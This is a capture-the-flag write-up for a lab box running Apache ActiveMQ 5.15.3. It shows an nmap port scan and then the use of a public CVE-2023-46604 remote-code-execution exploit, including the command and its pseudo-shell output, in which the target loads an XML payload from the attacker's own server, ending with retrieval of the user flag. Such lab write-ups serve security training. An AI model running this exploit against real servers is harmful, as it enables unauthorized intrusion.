# Prime Time (User)

## Description
Cisco Prime Infrastructure is a network management tool for managing network infrastructure. This server is a partial version, containing key components and files for testing, and can be exploited similarly to the full version.

## Solution

Given an IP, we run `nmap -T5 -p- IP` to scan the box. The scan reveals several open ports:

- Port 22: OpenSSH
- Port 1883: MQTT broker
- Port 5672: AMQP service
- Port 8161: HTTP (Jetty 9.2.22, "Apache ActiveMQ" title)
- Port 46655: tcpwrapped
- Port 61613: STOMP protocol
- Port 61614: HTTP (Jetty 9.2.22, supports risky methods)
- Port 61616: Apache ActiveMQ (version 5.15.3)

A quick search for exploits on "Jetty 9.2.22 RCE" and "ActiveMQ 5.15.3 RCE" led to this ActiveMQ exploit: [CVE-2023-46604-ActiveMQ-RCE-pseudoshell](https://github.com/duck-sec/CVE-2023-46604-ActiveMQ-RCE-pseudoshell).


```bash
$python3 exploit.py -i 10.129.230.87 -p 61616  -si 10.10.14.59 -sp 8080
#################################################################################
#  CVE-2023-46604 - Apache ActiveMQ - Remote Code Execution - Pseudo Shell      #
#  Exploit by Ducksec, Original POC by X1r0z, Python POC by evkl1d              #
#################################################################################

[*] Target: 10.129.230.87:61616
[*] Serving XML at: http://10.10.14.59:8080/poc.xml
[!] This is a semi-interactive pseudo-shell, you cannot cd, but you can ls-lah / for example.
[*] Type 'exit' to quit

#################################################################################
# Not yet connected, send a command to test connection to host.                 #
# Prompt will change to Apache ActiveMQ$ once at least one response is received #
# Please note this is a one-off connection check, re-run the script if you      #
# want to re-check the connection.                                              #
#################################################################################

[Target not responding!]$ whoami
prime
```

Using this exploit, we get a shell and retrieve the flag from `/home/activemq/user.txt`.
